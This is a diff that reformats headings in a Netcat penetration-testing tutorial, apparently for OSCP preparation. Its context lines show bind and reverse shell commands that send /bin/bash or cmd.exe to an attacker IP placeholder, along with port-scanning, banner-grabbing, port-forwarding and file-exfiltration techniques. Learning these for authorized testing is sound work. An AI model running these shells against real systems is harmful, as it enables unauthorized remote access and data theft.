@@ -14,7 +14,7 @@ We can use client mode to connect to any TCP/UDP port, allowing us to:
 
 &#x20; •     Connect to a network service manually.
 
-**Netcat**
+## **Netcat**
 
 Netcat first released in 1995(!) by _Hobbit_ is one of the “original” network penetration testing tools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”. The clearest definition of Netcat is from _Hobbit_ himself: a simple “utility which reads and writes data across network connections, using TCP or UDP protocols
 
@@ -64,9 +64,9 @@ The netcat tool supports some protocols, but it works mainly on the TCP protocol
 
 > There are some other protocols, such as RAW and others, and I will leave it to you to search for that
 
-\--\
-\
-Bind shell
+\--
+
+### Bind shell
 
 `nc -nvlp 4444 -e /bin/bash` ⇒ on the victim machine
 
@@ -74,7 +74,7 @@ Bind shell
 
 —
 
-#### Reverse Shell
+## Reverse Shell
 
 `nc -nvlp 4444` ⇒ on attacker machine
 
@@ -82,7 +82,7 @@ Bind shell
 
 `netcat` is a powerful tool often used in the OSCP (Offensive Security Certified Professional) exam for various purposes, such as setting up reverse shells, file transfers, port scanning, and even setting up a simple web server. Here are some common `netcat` use cases that are particularly relevant for the OSCP:
 
-#### 1. Reverse Shells
+### 1. Reverse Shells
 
 A reverse shell is a shell session initiated by the target machine to the attacker's machine. This is often used to bypass firewalls and NAT.
 
@@ -104,7 +104,7 @@ For Windows targets:
 nc.exe -e cmd.exe <attacker_ip> 4444
 ```
 
-#### 2. Bind Shells
+### 2. Bind Shells
 
 A bind shell is a shell session where the target machine opens a listening port and waits for an attacker to connect to it.
 
@@ -126,7 +126,7 @@ nc.exe -lvnp 4444 -e cmd.exe
 nc <target_ip> 4444
 ```
 
-#### 3. File Transfer
+### 3. File Transfer
 
 `netcat` can be used to transfer files between the attacker and the target machine.
 
@@ -155,7 +155,7 @@ If we want to download a folder, for example, that contains a lot of data Or Inf
 
 There are many ways, but I will Just One Way Using Netcat&#x20;
 
-#### 1. Netcat
+## 1. Netcat
 
 > You Will Compress The File And Then Transfer The Compressed File Which Holds A Lot Of Data
 
@@ -200,8 +200,7 @@ What if I discussed the same idea?
 **Inside these folders there is a lot of sensitive information and files**
 {% endhint %}
 
-\
-4\. Port Scanning
+### &#x20;4. Port Scanning
 
 `netcat` can be used to scan for open ports on a target machine.
 
@@ -209,7 +208,7 @@ What if I discussed the same idea?
 nc -zv <target_ip> 20-100
 ```
 
-#### 5. Banner Grabbing
+### 5. Banner Grabbing
 
 To gather information about services running on open ports.
 
@@ -219,7 +218,7 @@ nc <target_ip> 80
 
 You can then type something like `HEAD / HTTP/1.1` and press Enter twice to get the HTTP headers.
 
-#### 6. Setting Up a Simple Web Server
+### 6. Setting Up a Simple Web Server
 
 You can use `netcat` to serve a single HTTP response.
 
@@ -242,7 +241,7 @@ Serve the file with `netcat`:
 while true; do { echo -e 'HTTP/1.1 200 OK\r\n'; cat index.html; } | nc -lvnp 8080; done
 ```
 
-#### 7. Port Forwarding
+### 7. Port Forwarding
 
 You can forward traffic from one port to another using `netcat`.
 
@@ -304,7 +303,7 @@ By mastering these `netcat` commands and understanding how to use them in variou
 
 One major downside on the shown example is that you need Netcat on that target host which is very often not the case in real world scenario’s. In some cases Netcat is present, or we have a way to install it, but in many cases we need to use alternatives ways to connect back to the attack box. Let’s have a look at a few alternative ways to setup a reverse shell.
 
-_**Bash reverse shell**_
+## _**Bash reverse shell**_
 
 With can also use Bash to initiate a reverse shell from the target host to the attack box by using the following command:
 
